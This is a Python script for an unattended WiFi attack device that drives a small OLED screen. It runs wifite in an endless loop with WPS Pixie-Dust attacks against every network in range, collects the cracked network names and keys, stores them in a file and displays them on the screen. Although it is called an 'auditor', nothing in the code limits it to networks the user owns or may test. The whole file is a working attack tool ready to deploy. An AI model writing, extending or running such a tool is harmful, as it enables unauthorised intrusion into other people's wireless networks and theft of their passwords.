#!/usr/bin/env python3
"""
Autonomous WiFi Auditor — OLED version
- single-threaded, стабильный I²C
- рисуем через PIL.Image + трансформации (rotate + mirror)
- читаем stdout wifite и выводим короткий статус/текущую цель
- сохраняем и показываем историю взломанных сетей, время работы и используем весь дисплей
"""
import io
import json
import os
import pty
import re
import shlex
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime

from luma.core.interface.serial import i2c
from luma.oled.device import sh1107
from PIL import Image, ImageDraw, ImageFont

OLED_I2C_PORT = 0
OLED_ADDRESS = 0x3C
OLED_WIDTH = 128
OLED_HEIGHT = 128
OLED_OFFSET = 2
FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
FONT_SIZE = 10
RESULT_DISPLAY_SECONDS = 8
HISTORY_PATH = "/var/lib/wifite_history.json"

SCRIPT_START_TIME = time.time()

dev = None
font = None
running = True

status_lock = threading.Lock()
latest_status = ("WIFITE", "INITIALIZING")


def init_oled():
    global dev, font
    try:
        serial = i2c(port=OLED_I2C_PORT, address=OLED_ADDRESS)
        dev = sh1107(
            serial,
            width=OLED_WIDTH,
            height=OLED_HEIGHT,
            offset=OLED_OFFSET,
            rotate=0,
        )
        dev.clear()
        print("[+] OLED initialized", flush=True)
    except Exception as exc:
        dev = None
        print(f"[!] OLED init failed: {exc}", flush=True)

    if font is None:
        try:
            font = ImageFont.truetype(FONT_PATH, FONT_SIZE)
        except Exception:
            font = ImageFont.load_default()


def draw(lines):
    if not dev:
        return
    image = Image.new("1", (OLED_WIDTH, OLED_HEIGHT))
    draw_ctx = ImageDraw.Draw(image)
    line_height = FONT_SIZE + 2
    y = 2
    for line in lines:
        if y + line_height > OLED_HEIGHT - 2:
            break
        trimmed = line[:20]
        draw_ctx.text((2, y), trimmed, font=font, fill=255)
        y += line_height
    image = image.rotate(180)
    image = image.transpose(Image.FLIP_LEFT_RIGHT)
    dev.display(image)
    sys.stdout.flush()


def prepare_display_lines(status_lines):
    status_lines = [str(x).strip() for x in (status_lines or [])]
    line_height = FONT_SIZE + 2
    max_lines = max((OLED_HEIGHT - 4) // line_height, 8)
    reserved_slots = 7
    allowed_extras = max(0, max_lines - reserved_slots)

    timestamp = datetime.now().strftime("%H:%M:%S")
    elapsed = int(time.time() - SCRIPT_START_TIME)
    minutes, seconds = divmod(elapsed, 60)

    def build_line(prefix, value):
        prefix_clean = prefix.upper()
        value_str = (value or "").replace("\n", " ")
        available = max(0, 20 - len(prefix_clean) - 2)
        trimmed = value_str[:available]
        return f"{prefix_clean}: {trimmed}"

    payload = [
        "╔" + "═" * 18 + "╗",
        build_line("STAT", status_lines[0] if status_lines else "WAITING"),
        build_line("INFO", status_lines[1] if len(status_lines) > 1 else "NO DATA"),
    ]

    extras = [line for line in status_lines[2:allowed_extras + 2]]
    payload.extend(extras)

    payload.append("-" * 20)
    payload.append(build_line("UPTIME", f"{minutes:02d}:{seconds:02d}"))
    payload.append(build_line("CLOCK", timestamp))

    while len(payload) < max_lines - 1:
        payload.append("")
    payload.append("╚" + "═" * 18 + "╝")
    return payload[:max_lines]


def update_status(lines):
    display_lines = prepare_display_lines(lines)
    draw(display_lines)


def get_iface():
    cmd = "ls /sys/class/net/ | grep -E '^wl' | grep -v mon | head -1"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    iface = result.stdout.strip() or "wlan0"
    return iface


def strip_ansi_codes(text):
    return re.sub(r"\x1B[@-_][0-?]*[ -/]*[@-~]", "", text)


def parse_wifite_status_line(line):
    clean = strip_ansi_codes(line).strip()
    if not clean:
        return None

    row_match = re.match(
        r"^\s*\d+\s+(.+?)\s{2,}(\d+)\s+(\S+)\s+(\d+)[dD][bB]\s+(\S+)",
        clean,
    )
    if row_match:
        essid = row_match.group(1).strip() or "TARGET"
        channel = row_match.group(2)
        enc = row_match.group(3)
        pwr = row_match.group(4)
        wps = row_match.group(5).upper()
        detail = f"CH{channel} {enc} {pwr}db {wps}"
        return (essid[:20], detail[:20])

    lower = clean.lower()

    if "scanning" in lower:
        return ("SCANNING", clean[:20])
    if "target" in lower and ":" in clean:
        target = clean.split(":", 1)[1].strip()
        return ("TARGET", target[:20] or clean[:20])
    if "attacking" in lower:
        detail = clean.split("attacking", 1)[1].strip()
        return ("ATTACKING", detail[:20] or clean[:20])
    if "handshake" in lower:
        return ("HANDSHAKE", clean[:20])
    if "waiting" in lower:
        return ("WAITING", clean[:20])
    if "cracked" in lower and "handshake" not in lower:
        return ("RESULT", clean[:20])
    if "wps" in lower and "locked" not in lower:
        return ("WPS", clean[:20])
    if "no handshake" in lower:
        return ("NO HS", clean[:20])
    if "found" in lower and "network" in lower:
        return ("FOUND", clean[:20])

    return None


def sanitize_entry(entry):
    essid = str(entry.get("essid", "")).strip()
    key = str(entry.get("key", "")).strip()
    if not essid and not key:
        return None
    return {"essid": essid, "key": key}


def load_history():
    try:
        with open(HISTORY_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, list):
            return []
        cleaned = []
        for entry in data:
            if not isinstance(entry, dict):
                continue
            sanitized = sanitize_entry(entry)
            if sanitized:
                cleaned.append(sanitized)
        return cleaned
    except (FileNotFoundError, ValueError, json.JSONDecodeError):
        return []


def save_history(history):
    directory = os.path.dirname(HISTORY_PATH)
    if directory:
        os.makedirs(directory, exist_ok=True)
    try:
        with open(HISTORY_PATH, "w", encoding="utf-8") as f:
            json.dump(history, f, ensure_ascii=False, indent=2)
        try:
            os.chmod(HISTORY_PATH, 0o600)
        except PermissionError:
            pass
    except Exception as exc:
        print(f"[!] Failed to save history: {exc}", flush=True)


def merge_history(existing, new_entries):
    combined = {}
    for entry in existing + new_entries:
        sanitized = sanitize_entry(entry)
        if not sanitized:
            continue
        key = (sanitized["essid"].lower(), sanitized["key"])
        combined[key] = sanitized
    return list(combined.values())


def spawn_wifite_process(cmd):
    master_fd, slave_fd = pty.openpty()
    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        close_fds=True,
        text=False,
    )
    os.close(slave_fd)
    reader = io.TextIOWrapper(
        os.fdopen(master_fd, "rb", closefd=False),
        encoding="utf-8",
        errors="ignore",
        newline="\n",
    )
    return proc, reader


def wifite_status_reader(reader):
    global latest_status
    for raw_line in reader:
        if not raw_line:
            continue
        line = raw_line.rstrip("\n")
        clean_line = strip_ansi_codes(line).strip()
        if not clean_line:
            continue
        print(clean_line, flush=True)
        parsed = parse_wifite_status_line(clean_line)
        if parsed:
            with status_lock:
                latest_status = parsed


def handle_signal(signum, frame):
    global running
    running = False
    update_status(["SIGNAL RECEIVED", "STOPPING"])
    sys.exit(0)


def parse_cracked_output(output):
    results = []
    mac_pat = r"([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})"
    for line in output.strip().splitlines():
        clean = strip_ansi_codes(line).strip()
        if not clean or len(clean) < 15:
            continue
        if any(x in clean for x in ["ESSID", "----", "wifite", "Displaying", "Cracked"]):
            continue
        if not re.search(mac_pat, clean):
            continue
        parts = clean.split()
        if len(parts) < 2:
            continue
        essid = parts[0]
        if essid in ["[+]", "[!]", ":", ".", "NUM", "---", "DATE", "TYPE", "KEY"]:
            continue
        key = "N/A"
        m = re.search(r"(?:Key|PSK|PIN|Password):\s*(\S+)", clean, re.IGNORECASE)
        if m:
            key = m.group(1)
        else:
            if len(parts) >= 2:
                key = parts[1]
        results.append({"essid": essid, "key": key})
    seen = set()
    unique = []
    for entry in results:
        identifier = (entry["essid"].lower(), entry["key"])
        if identifier not in seen:
            seen.add(identifier)
            unique.append(entry)
    return unique


def run_wifite_once(iface, history):
    global latest_status
    latest_status = ("WIFITE", "WAITING")
    base_cmd = (
        f"wifite -i {iface} --pow 40 -p 60 --pixie "
        "--no-pmkid --wps-only --skip-crack"
    )
    cmd = base_cmd

    print(f"🚀 {cmd}", flush=True)
    update_status(["LAUNCH WIFITE", "WAITING..."])
    time.sleep(1)

    proc, reader = spawn_wifite_process(cmd)
    reader_thread = threading.Thread(
        target=wifite_status_reader,
        args=(reader,),
        daemon=True,
    )
    reader_thread.start()

    while proc.poll() is None and running:
        with status_lock:
            status = latest_status
        update_status([status[0][:20], status[1][:20]])
        time.sleep(1)

    proc.wait()
    reader.close()
    reader_thread.join(timeout=1)
    update_status(["WIFITE DONE", f"CODE {proc.returncode}"])
    print(f"[+] Wifite finished with code {proc.returncode}", flush=True)
    time.sleep(1)

    if proc.returncode == 0:
        res = subprocess.run(
            "wifite --cracked",
            shell=True,
            capture_output=True,
            text=True,
        )
        if res.returncode == 0:
            results = parse_cracked_output(res.stdout)
            if results:
                print(f"[+] Found {len(results)} new networks.", flush=True)
                history = merge_history(history, results)
                save_history(history)
            else:
                print("[-] No new cracked networks found.", flush=True)
        else:
            print(
                f"[!] Failed to list cracked networks (code {res.returncode}).",
                flush=True,
            )
    else:
        print("[!] Wifite exited with non-zero status.", flush=True)

    return history


def display_history(history):
    if not history:
        update_status(["NO RESULTS", "YET"])
        time.sleep(2)
        return
    print(f"[+] Showing {len(history)} stored networks on OLED.", flush=True)
    for net in history:
        essid = net["essid"][:16]
        key = net["key"][:16]
        update_status([f"SSID: {essid}", f"KEY: {key}"])
        for _ in range(RESULT_DISPLAY_SECONDS):
            if not running:
                return
            time.sleep(1)


def main():
    global running
    if os.geteuid() != 0:
        print("⛔ Run with sudo!", flush=True)
        sys.exit(1)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    history = load_history()
    if history:
        print("[+] Previously cracked networks stored:", flush=True)
        for net in history:
            print(f"    SSID: {net['essid']} | KEY: {net['key']}", flush=True)
    else:
        print("[+] No stored cracked networks yet.", flush=True)

    init_oled()
    update_status(["STARTING", "WIFITE"])
    iface = get_iface()
    update_status(["INTERFACE", iface[:20]])
    time.sleep(1)

    os.system("rfkill unblock all")
    os.system(f"nmcli dev set {iface} managed no 2>/dev/null")

    while running:
        history = run_wifite_once(iface, history)
        display_history(history)

        for _ in range(10):
            if not running:
                break
            update_status(["IDLE", "RESTART IN 10s"])
            time.sleep(1)

    update_status(["STOPPED", "BY SIGNAL"])
    print("[!] Exiting main loop.", flush=True)


if __name__ == "__main__":
    main()
